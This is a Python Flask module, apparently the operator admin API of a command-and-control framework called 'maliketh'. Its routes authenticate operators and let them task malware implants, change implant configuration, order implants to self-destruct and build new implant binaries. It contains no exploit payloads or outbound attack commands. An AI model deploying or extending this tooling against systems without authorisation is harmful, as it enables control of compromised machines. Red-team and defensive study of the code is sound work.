import nacl
import nacl.exceptions

from datetime import datetime, timedelta
from typing import Any
from flask import Blueprint, jsonify, request
from maliketh.db import db
from maliketh.models import *
from maliketh.crypto.ec import *
from maliketh.crypto.utils import random_hex
from maliketh.config import OP_ROUTES
from maliketh.opcodes import Opcodes
from maliketh.builder.builder import ImplantBuilder, BuilderOptions
from maliketh.listeners.utils import error_json, success_json, create_route
from functools import wraps

admin = Blueprint("admin", __name__, url_prefix=OP_ROUTES["base_path"])
start_time = datetime.now()


def verify_auth_token(request) -> Optional[Operator]:
    """
    Given a request, verify its Authentication header

    :param request: The request to verify
    :return The operator username if the token is valid, otherwise None
    """
    # Get bearer token
    token = request.headers.get("Authorization", None)
    if token is None:
        return None

    # Check if it's a bearer token
    if not token.startswith("Bearer "):
        return None

    # Get the token
    token = token[7:]

    # Get the operator
    operator = Operator.query.filter_by(auth_token=token).first()
    if operator is None:
        return None

    # Check if the token is still valid
    token_exp = datetime.strptime(operator.auth_token_expiry, "%Y-%m-%d %H:%M:%S")
    if token_exp < datetime.now():
        return None

    return operator


def verified(func):
    """
    Decorator to check if the request is authenticated and the operator hasnt had their access revoked.

    :param func: The function to decorate
    :return The decorated function with the operator as a keyword argument
    """

    @wraps(func)
    def wrapper(*args, **kwargs):
        # Check if the request is authenticated
        operator = verify_auth_token(request)
        if operator is None:
            return error_json("Not authenticated")

        if operator.revoked:
            return error_json(
                "Your access has been revoked. Please contact the admin to resolve."
            )

        kwargs = {**kwargs, "operator": operator}
        return func(*args, **kwargs)

    return wrapper


@create_route(admin, "stats")
@verified
def server_stats(operator: Operator) -> Any:
    """
    Get basic statistics about the server
    """
    # Get number of implants, number of active tasks, total number of tasks
    # number of operators
    num_implants = Implant.query.count()
    num_active_tasks = Task.query.filter_by(
        operator_name=operator.username, status="active"
    ).count()
    num_total_tasks = Task.query.filter_by(operator_name=operator.username).count()
    num_operators = Operator.query.count()

    return jsonify(
        {
            "status": True,
            "implants": num_implants,
            "active_tasks": num_active_tasks,
            "total_tasks": num_total_tasks,
            "operators": num_operators,
            "uptime": str(datetime.now() - start_time),
        }
    )


@create_route(admin, "request_auth_token")
def request_token() -> Any:
    # Check if X-ID and X-Signature header is present
    if any(x not in request.headers for x in ["X-ID", "X-Signature"]):
        return error_json("Unknown operator key", 400)

    # Check if they have content
    if any(len(request.headers[x]) == 0 for x in ["X-ID", "X-Signature"]):
        return error_json("Unknown operator key", 400)

    # X-Signature is in format base64(enc_and_sign(pub_key, operator_signing_key, server_pub_key))
    # So we need to decrypt it with the server public key,
    # Then verify the signature with the operator signing key

    # Get the operator from X-ID
    operator = Operator.query.filter_by(username=request.headers["X-ID"]).first()
    if operator is None:
        return error_json("Unknown operator", 400)

    try:
        original_message = decrypt_and_verify(
            bytes(request.headers["X-Signature"], "utf-8"), operator
        )
    except nacl.exceptions.CryptoError:
        return error_json("Couldn't decrypt signature", 400)

    if original_message is None:
        return error_json("Couldn't verify signature", 400)

    original_message = original_message.decode("utf-8")

    if original_message != operator.login_secret:
        return error_json("Unable to verify signature", 400)

    # If we get here, the operator is authenticated

    # Check if the token is still valid

    if (
        operator.auth_token_expiry is not None
        and datetime.strptime(operator.auth_token_expiry, "%Y-%m-%d %H:%M:%S")
        > datetime.now()
    ):
        token = operator.auth_token
    else:
        # Generate a new token
        token = random_hex(128)
        operator.auth_token = token
        operator.auth_token_expiry = (datetime.now() + timedelta(hours=6)).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        db.session.commit()

    return (
        jsonify(
            {
                "status": True,
                "token": token,
                "rmq_queue": "",
                "rmq_host": "",
                "rmq_port": 1,
            }
        ),
        200,
    )


@create_route(admin, "revoke_auth_token")
@verified
def revoke_token(operator: Operator) -> Any:
    operator.auth_token = None  # type: ignore
    operator.auth_token_expiry = None  # type: ignore
    db.session.commit()
    return jsonify({"status": True}), 200


@create_route(admin, "auth_token_status")
def token_status() -> Any:
    operator = verify_auth_token(request)
    if operator is None:
        return error_json("Not authenticated")
    return success_json("Authenticated")


@create_route(admin, "list_tasks")
@verified
def list_tasks(operator: Operator) -> Any:
    """
    Get a list of tasks issued by this operator
    """
    tasks = Task.query.filter_by(operator_name=operator.username).all()
    return jsonify({"status": True, "tasks": [x.toJSON() for x in tasks]}), 200


@create_route(admin, "add_task")
@verified
def add_task(operator: Operator) -> Any:
    """
    Add a new task
    """

    if request.json is None:
        return error_json("Invalid request, no JSON body", 400)

    # Get the task
    task = request.json

    required_fields = ["implant_id", "opcode", "args"]

    # Check if the task is valid
    if any(x not in task for x in required_fields):
        return error_json(
            f"Invalid task, missing fields: {', '.join(required_fields - task.keys())}",
            400,
        )

    # Create the task
    task = Task.new_task(
        operator.username,
        task["implant_id"],
        task["opcode"],
        task["args"],
    )

    return jsonify({"status": True, "task": task.toJSON()}), 200


@create_route(admin, "task_results")
@verified
def get_task_result(operator: Operator, task_id: str) -> Any:
    """
    Get the result of a task
    """
    # Check if this operator owns the task
    task = Task.query.filter_by(task_id=task_id).first()
    if task is None:
        return error_json("Unknown task", 400)

    if task.operator_name != operator.username:
        return error_json("Unauthorized")

    return jsonify({"status": True, "result": task.output}), 200


@create_route(admin, "delete_task")
@verified
def delete_task(operator: Operator, task_id: str) -> Any:
    """
    Delete a task
    """
    # Check if this operator owns the task
    task = Task.query.filter_by(task_id=task_id).first()
    if task is None:
        return error_json("Unknown task", 400)

    if task.operator_name != operator.username:
        return error_json("Unauthorized")

    db.session.delete(task)
    db.session.commit()

    return jsonify({"status": True}), 200


@create_route(admin, "list_implants")
@verified
def list_implants(operator: Operator) -> Any:
    """
    Get a list of all implants
    """
    implants = Implant.query.all()
    return jsonify({"status": True, "implants": [x.toJSON() for x in implants]}), 200


@create_route(admin, "update_implant_config")
@verified
def update_config(operator: Operator, implant_id: str) -> Any:
    """
    Update the config of an implant. This will trigger a config update task
    """
    if request.json is None:
        return error_json("Invalid request, no JSON body", 400)

    # Get the task
    config = request.json

    # Update implant's config in the database
    current_config = ImplantConfig.query.filter_by(implant_id=implant_id).first()
    if current_config is None:
        return error_json("Unknown implant", 400)

    try:
        # Remove keys in the request that are not valid
        config = {
            k: v
            for k, v in config.items()
            if k in ImplantConfig.__table__.columns.keys()
        }

        if len(config) == 0:
            return error_json("No valid fields found in request", 400)

        # Update fields present in the request
        for key, value in config.items():
            setattr(current_config, key, value)
        db.session.commit()

        # Create the task
        task = Task.new_task(
            operator.username, implant_id, Opcodes.UPDATE_CONFIG.value, config
        )
    except Exception as e:
        print(e)
        return error_json(f"Error updating config: {e}", 400)

    return jsonify({"status": True, "task": task.toJSON()}), 200


@create_route(admin, "get_implant_config")
@verified
def get_implant_config(implant_id: str, operator: Operator) -> Any:
    """
    Get the config of an implant
    """
    config = ImplantConfig.query.filter_by(implant_id=implant_id).first()
    if config is None:
        return error_json("Unknown implant", 400)

    return jsonify({"status": True, "config": config.toJSON()}), 200


@create_route(admin, "kill_implant")
@verified
def kill_implant(operator: Operator, implant_id: str) -> Any:
    """
    Send a SELFDESTRUCT task to an implant
    """

    # See if implant exists
    implant = Implant.query.filter_by(implant_id=implant_id).first()
    if implant is None:
        return error_json("Unknown implant", 400)

    # Create the task
    Task.new_task(
        operator.username,
        implant_id,
        Opcodes.SELFDESTRUCT.value,
        [],
    )

    # Do not handle deleting here, the C2 listener will take care of it.

    return jsonify({"status": True}), 200


@create_route(admin, "build_implant")
@verified
def build_implant(operator: Operator) -> Any:
    """
    Build an implant
    """
    if request.json is None:
        return error_json("Invalid request, no JSON body", 400)

    # Get the build options
    build_opts_json = request.json

    builder = ImplantBuilder(operator.username)
    implant_bytes = builder.with_options(
        BuilderOptions.from_dict(build_opts_json)
    ).build()
    if implant_bytes is None:
        return error_json("Error building implant", 500)

    return (
        jsonify(
            {"status": True, "implant": base64.b64encode(implant_bytes).decode("utf-8")}
        ),
        200,
    )


@create_route(admin, "admin_revoke_operator")
@verified
def admin_revoke_operator(operator: Operator):
    """
    Administrative endpoint to revoke operators access.
    """

    if request.json is None:
        return error_json("Invalid request, no JSON body", 400)
